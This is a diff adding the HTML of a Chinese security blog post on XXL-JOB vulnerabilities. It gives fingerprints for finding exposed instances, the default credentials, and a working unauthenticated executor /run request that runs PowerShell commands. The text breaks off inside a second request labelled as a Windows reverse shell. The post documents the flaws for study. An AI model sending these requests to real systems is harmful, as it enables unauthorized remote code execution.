@@ -1,0 +1,1457 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="XXLJOB常见漏洞">
+<title>XXL Job常见漏洞</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="XXL Job常见漏洞">
+<meta property='og:description' content="XXLJOB常见漏洞">
+<meta property='og:url' content='https://lserein.github.io/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-07T17:42:22&#43;08:00'/><meta property='article:modified_time' content='2026-01-08T11:10:29&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.jpg' />
+<meta name="twitter:title" content="XXL Job常见漏洞">
+<meta name="twitter:description" content="XXLJOB常见漏洞"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huc83695a2748b8374c632d172527a7db7_35249_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1默认口令">1.默认口令</a></li>
+    <li><a href="#2xxl-job-executor-未授权访问rce漏洞">2.XXL-JOB executor 未授权访问RCE漏洞</a></li>
+    <li><a href="#3xxl-job-任务调度中心-后台任意命令执行漏洞">3.XXL-JOB 任务调度中心 后台任意命令执行漏洞</a></li>
+    <li><a href="#4xxl-job-api未授权hessian2反序列化复现">4.XXL-JOB api未授权hessian2反序列化复现</a>
+      <ol>
+        <li><a href="#41利用jndi注入打内存马"><strong>4.1.利用JNDI注入打内存马</strong></a></li>
+      </ol>
+    </li>
+    <li><a href="#5xxl-job-数据库rce">5.XXL-JOB 数据库RCE</a></li>
+    <li><a href="#6xxl-job-后台ssrf漏洞">6.XXL-JOB 后台SSRF漏洞</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">
+                <img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo_hu7aa57c2307c5d87743a54f76552536bc_313547_800x0_resize_q75_box.jpg"
+                        srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo_hu7aa57c2307c5d87743a54f76552536bc_313547_800x0_resize_q75_box.jpg 800w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo_hu7aa57c2307c5d87743a54f76552536bc_313547_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="443" 
+                        loading="lazy"
+                        alt="Featured image of post XXL Job常见漏洞" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Web安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">XXL Job常见漏洞</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            XXLJOB常见漏洞
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 07, 2026</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">+------------------+</span>        <span class="n">HTTP</span>         <span class="o">+---------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">调度中心</span>        <span class="o">|</span> <span class="o">------------------&gt;</span> <span class="o">|</span>     <span class="n">执行器应用</span>       <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">(</span><span class="n">xxl</span><span class="o">-</span><span class="n">job</span><span class="o">-</span><span class="n">admin</span><span class="p">)</span>  <span class="o">|</span>   <span class="n">调用</span> <span class="o">/</span><span class="n">run</span> <span class="n">接口</span>    <span class="o">|</span> <span class="p">(</span><span class="n">your</span> <span class="n">Spring</span> <span class="n">Boot</span> <span class="n">app</span><span class="p">)</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">端口</span><span class="err">：</span><span class="mi">8080</span>       <span class="o">|</span> <span class="o">&lt;------------------</span> <span class="o">|</span> <span class="n">端口</span><span class="err">：</span><span class="n">默认比如</span> <span class="mi">9999</span>      <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">+------------------+</span>    <span class="n">返回执行结果</span>     <span class="o">+---------------------+</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>调度中心（admin）：负责任务管理、触发、日志查看，不执行任务；</p>
+<p>执行器（executor）：是你自己开发的任务运行程序，必须实现 JobHandler 并暴露 /run 接口。</p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/vUr4kLQ88coHxxLbb-ZwxA"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/vUr4kLQ88coHxxLbb-ZwxA</a></p>
+<p>常见指纹</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;XXL-JOB&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">title</span><span class="o">=</span><span class="s2">&#34;任务调度中心&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">body</span><span class="o">=</span><span class="s2">&#34;jobconf_trigger_type&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">web</span><span class="o">.</span><span class="n">icon</span><span class="o">==</span><span class="s2">&#34;421c7c35244591f892496fe4d6e51921&#34;</span><span class="n">body</span><span class="o">=</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">code</span><span class="se">\&#34;</span><span class="s2">:500,</span><span class="se">\&#34;</span><span class="s2">msg</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">invalid request, HttpMethod not support.</span><span class="se">\&#34;</span><span class="s2">}&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="1默认口令">1.默认口令
+</h2><p>http://localhost:8080/xxl-job-admin/</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin:123456
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="2xxl-job-executor-未授权访问rce漏洞">2.XXL-JOB executor 未授权访问RCE漏洞
+</h2><p><strong>影响版本：XXL-JOB &lt;= 2.4</strong></p>
+<p>利用前提：</p>
+<ol>
+<li><strong>/run 接口无需身份认证即可访问</strong>（即未授权）；</li>
+<li>或者攻击者能绕过认证（如通过伪造 Cookie、默认凭证等）；</li>
+</ol>
+<p>默认token为<strong>default_token，硬编码在配置文件中</strong></p>
+<p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/1.png"
+	width="1694"
+	height="618"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/1_huf6b53841b6d2b0ee2895fb5cc88b7e28_98133_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/1_huf6b53841b6d2b0ee2895fb5cc88b7e28_98133_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="274"
+		data-flex-basis="657px"
+	
+></p>
+<ol>
+<li>后端未对 <code>glueSource</code> 内容做安全校验，且 Glue 脚本（尤其是 <code>GLUE_SHELL</code>）可被执行。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">run</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="mf">192.168.112.203</span><span class="p">:</span><span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="n">Win64</span><span class="p">;</span> <span class="n">x64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">146.0</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">146.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span><span class="p">,</span> <span class="n">br</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec</span><span class="o">-</span><span class="n">GPC</span><span class="p">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">XXL</span><span class="o">-</span><span class="n">JOB</span><span class="o">-</span><span class="n">ACCESS</span><span class="o">-</span><span class="n">TOKEN</span><span class="p">:</span> <span class="n">default_token</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="p">:</span> <span class="n">u</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">356</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;jobId&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;executorHandler&#34;</span><span class="p">:</span> <span class="s2">&#34;demoJobHandler&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;executorParams&#34;</span><span class="p">:</span> <span class="s2">&#34;demoJobHandler&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;executorBlockStrategy&#34;</span><span class="p">:</span> <span class="s2">&#34;COVER_EARLY&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;executorTimeout&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;logId&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;logDateTime&#34;</span><span class="p">:</span> <span class="mi">1586629003729</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;glueType&#34;</span><span class="p">:</span> <span class="s2">&#34;GLUE_POWERSHELL&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;glueSource&#34;</span><span class="p">:</span> <span class="s2">&#34;calc&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;glueUpdatetime&#34;</span><span class="p">:</span> <span class="mi">1586699003758</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;broadcastIndex&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;broadcastTotal&#34;</span><span class="p">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/2.png"
+	width="2555"
+	height="1057"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/2_hu27bd35535baf19ec5b734317391a87e0_318800_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/2_hu27bd35535baf19ec5b734317391a87e0_318800_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="580px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">//</span><span class="n">Windows下反弹shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">run</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="mf">192.168.112.203</span><span class="p">:</span><span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="n">Win64</span><span class="p">;</span> <span class="n">x64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">146.0</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">146.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.2</span>
